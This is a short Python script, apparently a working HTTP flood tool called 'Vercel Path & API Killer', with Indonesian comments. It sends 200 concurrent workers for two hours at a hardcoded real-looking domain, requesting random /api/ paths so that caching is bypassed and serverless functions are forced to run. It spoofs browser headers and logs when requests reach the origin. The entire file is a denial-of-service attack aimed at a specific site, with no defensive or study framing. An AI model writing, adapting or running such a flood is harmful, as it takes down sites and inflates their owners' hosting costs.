#!/usr/bin/env python3
# kill.py — Vercel Path & API Killer
import asyncio, aiohttp, random, string, sys

TARGET = "https://www.ronajiwa.my.id"
CONCURRENCY = 200
DURATION = 3600 * 2 

def rand_path():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

async def worker(session_id, session):
    while True:
        try:
            # Tembak path random (bukan query). 
            # Ini maksa Vercel nyari rute API/Function, bukan halaman statis.
            url = f"{TARGET}/api/{rand_path()}"
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "Accept": "application/json", # Pura-pura minta JSON (API request)
                "Content-Type": "application/json",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache"
            }
            
            async with session.get(url, headers=headers, timeout=10, ssl=False) as r:
                await r.read()
                status = r.status
                cache = r.headers.get("x-vercel-cache", "NONE")
                
                # Cuma print kalau dapet 404/500 (artinya origin kerja)
                if status in [404, 500, 502]:
                    print(f"[BOT-{session_id}] {status} | cache={cache} (ORIGIN HIT!)", flush=True)
                elif status == 200:
                    print(f"[BOT-{session_id}] {status} | cache={cache}", flush=True)
        except Exception:
            pass

async def main():
    conn = aiohttp.TCPConnector(limit=CONCURRENCY, ssl=False, force_close=True)
    async with aiohttp.ClientSession(connector=conn) as s:
        print(f"[*] API PATH FLOOD STARTING: {CONCURRENCY} WORKERS", flush=True)
        tasks = [asyncio.create_task(worker(i, s)) for i in range(CONCURRENCY)]
        try:
            await asyncio.sleep(DURATION)
        except KeyboardInterrupt:
            pass
        for t in tasks: t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

if __name__ == "__main__":
    asyncio.run(main())
